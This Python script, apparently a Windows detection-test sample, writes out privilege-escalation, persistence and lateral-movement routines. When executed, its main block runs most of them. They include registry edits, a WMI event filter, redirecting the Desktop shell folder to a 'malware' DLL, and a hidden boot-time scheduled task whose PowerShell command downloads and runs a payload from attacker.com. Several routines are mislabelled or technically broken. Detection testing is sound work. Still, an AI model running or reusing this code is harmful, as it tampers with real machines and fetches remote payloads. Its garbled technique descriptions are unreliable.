#!/usr/bin/env python3
"""
Privilege escalation and persistence detection test
Contains patterns commonly used in advanced persistent threats (APTs)
"""

import os
import subprocess
import winreg

# PRIVILEGE ESCALATION PATTERN 1: UAC bypass via registry
def bypass_uac_registry():
    """Bypass User Account Control using registry manipulation"""
    # UEME_RUNPATH UAC bypass
    reg_path = r"Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"

    try:
        hkey = winreg.CreateKeyEx(
            winreg.HKEY_CURRENT_USER,
            reg_path,
            0,
            winreg.KEY_ALL_ACCESS
        )
        winreg.SetValueEx(
            hkey,
            r"C:\Windows\System32\eventvwr.exe",
            0,
            winreg.REG_SZ,
            "RUNASADMIN"
        )
    except:
        pass

# PRIVILEGE ESCALATION PATTERN 2: Token theft via named pipe
def steal_admin_token():
    """Steal admin token via named pipe impersonation"""
    import ctypes

    # Named pipe used by Windows services
    pipe = r"\\.\pipe\InitShutdown"

    try:
        handle = ctypes.windll.kernel32.CreateFileA(
            pipe.encode(),
            0x0001,  # FILE_WRITE_DATA
            0, None, 3,  # OPEN_EXISTING
            0, None
        )
    except:
        pass

# PERSISTENCE PATTERN 1: WMI Event Subscription
def persist_via_wmi():
    """Create WMI event subscription for persistence"""
    cmd = """
    wmic os get name /value | find "Windows" > nul && (
        wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name="Updater", EventNamespace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
    )
    """
    subprocess.Popen(cmd, shell=True)

# PERSISTENCE PATTERN 2: COM hijacking
def hijack_com_object():
    """Hijack COM object for persistence"""
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"

    try:
        hkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path)
        # Modify shell folder COM reference
        winreg.SetValueEx(
            hkey,
            "Desktop",
            0,
            winreg.REG_SZ,
            r"C:\malware\fake_shell.dll"
        )
    except:
        pass

# PERSISTENCE PATTERN 3: Scheduled Task with XML
def create_schtask_persistence():
    """Create scheduled task with embedded payload"""
    xml_payload = """
    <?xml version="1.0" encoding="UTF-16"?>
    <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
      <Triggers>
        <BootTrigger>
          <Enabled>true</Enabled>
        </BootTrigger>
      </Triggers>
      <Actions>
        <Exec>
          <Command>powershell.exe</Command>
          <Arguments>-NoProfile -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload')"</Arguments>
        </Exec>
      </Actions>
    </Task>
    """

    subprocess.Popen(
        f'schtasks /create /tn "WindowsUpdate" /xml "{xml_payload}" /f',
        shell=True
    )

# LATERAL MOVEMENT PATTERN: Pass-the-hash
def pass_the_hash(target_ip, hash_value):
    """Use compromised hash to move laterally"""
    cmd = f'psexec.exe -accepteula \\\\{target_ip} -h -u DOMAIN\\Admin -p {hash_value}:x cmd.exe'
    subprocess.Popen(cmd, shell=True)

if __name__ == "__main__":
    bypass_uac_registry()
    steal_admin_token()
    persist_via_wmi()
    hijack_com_object()
    create_schtask_persistence()
